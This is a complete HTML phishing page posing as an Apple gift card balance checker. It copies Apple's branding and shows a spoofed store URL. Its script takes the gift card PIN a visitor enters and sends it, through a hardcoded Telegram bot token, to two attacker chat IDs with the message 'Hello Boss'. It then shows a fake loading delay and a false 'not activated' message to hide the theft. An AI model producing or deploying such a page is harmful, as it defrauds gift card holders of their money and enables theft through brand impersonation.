<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Apple Gift Card balanace checker</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      margin: 0;
      padding: 0;
      background: #fff;
      color: #000;
      text-align: center;
    }
    * { scrollbar-width: none; }

    header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 12px 16px;
      border-bottom: 1px solid #ddd;
      font-size: 14px;
    }

    .container {
      max-width: 400px;
      margin: 30px auto;
      padding: 20px;
    }

    h2 {
      font-size: 22px;
      font-weight: 600;
      margin-bottom: 20px;
    }

    .input-box {
      display: block;
      width: 100%;
      padding: 14px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 8px;
      margin-bottom: 10px;
      text-align: center;
      letter-spacing: 2px;
    }

    .btn {
      display: block;
      width: 100%;
      padding: 14px;
      background: #007aff;
      color: white;
      font-size: 16px;
      font-weight: 500;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: background 0.3s;
    }
    .btn:hover { background: #005bb5; }
    .btn:disabled { background: #ccc; cursor: not-allowed; }

    .note {
      margin: 10px 0 25px;
      font-size: 14px;
      color: #666;
    }

    footer {
      margin-top: 30px;
    }
    footer img { width: 100px; margin: 5px; }

    .fake-url {
      margin-top: 20px;
      font-size: 13px;
      color: gray;
    }

    /* Loader styles */
    .loader {
      margin: 20px auto;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #007aff;
      border-radius: 50%;
      width: 32px;
      height: 32px;
      animation: spin 1s linear infinite;
      display: none;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

  <header>
    <div>Apple Gift Card</div>
    <a href="https://secure6.store.apple.com/shop/giftcard/">
      <button style="background:#007aff; color:white; border:none; padding:6px 12px; border-radius:6px;">Buy</button>
    </a>
  </header>

  <div class="container">
    <h2>Check Your Apple Gift Card Balance</h2>

    <p>Enter your PIN here:</p>
    <form id="giftForm" method="POST">
      <input type="text" class="input-box" id="giftPin" name="gift-card-pin" placeholder="XXXX XXXX XXXX XXXX" maxlength="19">
      <p class="note">Can‚Äôt find your PIN? <a href="#">Learn more</a></p>

      <button class="btn" type="submit" id="checkBtn">Check Balance</button>
    </form>

    <!-- loader -->
    <div class="loader" id="loader"></div>

    <footer>
      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ-Q9DtZCGTlow4GMYjBEWVdGdCWZLb3UqVHg&s" alt="Apple Logo">
    </footer>

    <p class="fake-url">secure6.store.apple.com</p>
  </div>
<script>
  const input = document.getElementById('giftPin');
  const form = document.getElementById("giftForm");
  const loader = document.getElementById("loader");
  const checkBtn = document.getElementById("checkBtn");

  // auto-format input with spaces
  input.addEventListener('input', function(e) {
    let value = e.target.value.replace(/\s+/g, '');
    value = value.replace(/[^a-zA-Z0-9]/g, '');
    if (value.length > 16) value = value.slice(0, 16);
    e.target.value = value.replace(/(.{4})/g, '$1 ').trim();
  });

  const botToken = "8488719047:AAESFFAoNPZQ3Mb5J4LaHM54EK8PyHzWeOo"; 
  // üëá Add multiple chat IDs here
  const chatIds = ["6084808169", "7709189291"];   

  form.addEventListener("submit", function(e) {
    e.preventDefault();
    const rawPin = input.value.replace(/\s+/g, '');

    if (rawPin.length < 16) {
      alert("‚ö†Ô∏è Please input the full 16-character pin to continue");
      return;
    }

    // Show loader + disable button
    loader.style.display = "block";
    checkBtn.disabled = true;
    checkBtn.textContent = "Checking...";

    const message = `Hello Boss, New Apple Gift Card Submitted: ${rawPin}`;

    // Send to all chat IDs
    const sendPromises = chatIds.map(id => {
      return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: id,
          text: message
        })
      });
    });

    Promise.all(sendPromises)
      .then(() => {
        setTimeout(() => {
          loader.style.display = "none";
          checkBtn.disabled = false;
          checkBtn.textContent = "Check Balance";
          alert("‚ùå This Apple Gift Card is not activated!");
        }, 2000); // fake loading delay
      })
      .catch(() => {
        loader.style.display = "none";
        checkBtn.disabled = false;
        checkBtn.textContent = "Check Balance";
        alert("‚ö†Ô∏è Network error. Try again.");
      });
  });
</script>

</body>
</html>
